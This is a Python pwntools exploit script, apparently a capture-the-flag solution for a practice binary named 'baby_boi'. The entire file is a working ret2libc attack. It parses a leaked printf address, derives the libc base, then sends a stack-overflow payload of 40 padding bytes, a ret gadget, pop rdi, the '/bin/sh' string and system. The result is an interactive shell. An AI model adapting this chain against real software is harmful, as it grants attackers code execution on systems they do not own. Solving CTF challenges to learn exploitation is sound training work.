#!/usr/bin/env python3
# -*- coding: utf-8 -*-
# This exploit template was generated via:
# $ pwn template baby_boi_patched
from pwn import *

# Set up pwntools for the correct architecture
exe = context.binary = ELF(args.EXE or 'baby_boi')
libc = ELF('/lib/x86_64-linux-gnu/libc.so.6')

# Many built-in settings can be controlled on the command-line and show up
# in "args".  For example, to dump all data sent/received, and disable ASLR
# for all created processes...
# ./exploit.py DEBUG NOASLR



def start(argv=[], *a, **kw):
    '''Start the exploit against the target.'''
    if args.GDB:
        return gdb.debug([exe.path] + argv, gdbscript=gdbscript, *a, **kw)
    else:
        return process([exe.path] + argv, *a, **kw)

# Specify your GDB script here for debugging
# GDB will be launched if the exploit is run via e.g.
# ./exploit.py GDB
gdbscript = '''
b *main+167
continue
'''.format(**locals())

#===========================================================
#                    EXPLOIT GOES HERE
#===========================================================
# Arch:     amd64-64-little
# RELRO:    Partial RELRO
# Stack:    No canary found
# NX:       NX enabled
# PIE:      No PIE (0x3fe000)
# RUNPATH:  b'.'

io = start()

# shellcode = asm(shellcraft.sh())

io.recvline()
leak = io.recvline().split()
printf_leak = int(leak[3], 16)

# log.info(hex(printf_leak))

# log.info(libc.address) init with 0
# set the libc addr

libc.address = printf_leak - libc.symbols['printf']

# log.info(hex(libc.address))

SYSTEM = libc.symbols['system']

POP_RDI = 0x0000000000400793 # pop rdi ; ret

BIN_SH = next(libc.search('/bin/sh'))

RET = 0x000000000040054e # ret

payload = flat(
    "A" * 40,
    RET,
    POP_RDI,
    BIN_SH,
    SYSTEM
)


io.sendline(payload)

# flag = io.recvline()
# log.success(flag)

io.interactive()